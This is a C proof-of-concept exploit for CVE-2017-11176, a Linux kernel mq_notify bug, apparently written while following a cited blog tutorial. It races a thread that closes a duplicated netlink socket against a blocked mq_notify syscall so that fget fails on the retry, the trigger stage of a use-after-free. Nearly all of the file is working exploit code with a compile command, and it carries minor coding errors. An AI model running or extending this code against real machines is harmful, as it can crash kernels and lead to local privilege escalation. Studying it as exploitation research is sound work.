
// https://blog.lexfo.fr/cve-2017-11176-linux-kernel-exploitation-part1.htm

/* Aim
making fget fail on the second loop
*/
//gcc -lrt -pthread exploit.c -o exploit

#define _GNU_SOURCE
#include <sys/syscall.h>
#include <unistd.h>
#include <mqueue.h>
#include <signal.h>
#include <stdlib.h>
#include <stdio.h>
#include <asm/types.h>
#include <sys/socket.h>
#include <linux/netlink.h>

#define _mq_notify(mqdes, sevp) syscall(__NR_mq_notify, mqdes, sevp)
#define _socket(domain, type, protocol) syscall(__NR_socket, domain, type, protocol)
#define _setsockopt(socket, level, option_name, option_value, option_len) syscall(__NR_setsockopt, socket, level, option_name, option_value, option_len)
#define _close(fd) syscall(__NR_close, fd)              
#define _dup(oldfd) syscall(__NR_dup, oldfd)            

struct thread_data
{
    int blockFD;
    int sockFD;
};

void* unblock(void *threadVar)
{
    sleep(5);
    struct thread_data* my_data = (struct thread_data*) threadVar;
    int blockFD = my_data->blockFD;
    int sockFD = my_data->sockFD;
    if(_close(sockFD) != 0)
    {
        perror("close");
    }
    printf("[unblock] closed fd %d\n", sockFD);

    int val = 55;
    printf("[unblock] about to unblock\n");
    if(_setsockopt(blockFD, SOL_NETLINK, NETLINK_NO_ENOBUFS, &val, sizeof(val)))
        perror("setsockopt");
}

int main()
{
    struct sigevent sevp;
    char* buf;
    buf = (char *)malloc(32*sizeof(char));
    int sockFD = _socket(AF_NETLINK, SOCK_RAW ,NETLINK_GENERIC);
    if(sockFD < 0)
    {
        perror("socket");
        return -1;
    }
    printf("[main] netlink sock created = %d\n", sockFD);

    struct thread_data th_data;
    th_data.sockFD = sockFD;
    int ret = _dup(sockFD);
    if(sockFD == -1)
    {
        perror("dup");
        return -1;
    }
    th_data.blockFD = ret;
    printf("[main] duplicate netlink sock created = %d\n", ret);

    
    pthread_t thread;
    if(pthread_create(&thread, NULL, &unblock, (void *) &th_data))
    {
        perror("pthread_create");
        return -1;
    }
    printf("[main] created unblock thread\n");

    sevp.sigev_notify = SIGEV_THREAD;
    sevp.sigev_value.sival_ptr = buf;
    sevp.sigev_signo = sockFD;

    mqd_t mqdes = (mqd_t) -1; // ??
    
   // printf("%p\n", &sevp);
    printf("[main] about to get blocked\n");
    if(_mq_notify(mqdes, &sevp)==0)
    {
        printf("call succeeded\n");
    }
    else
    {
        perror("mq_notify SysCall");
        printf("call failed\n");
        return -1;
    }

    pthread_join(thread, NULL);
    return 0;
}
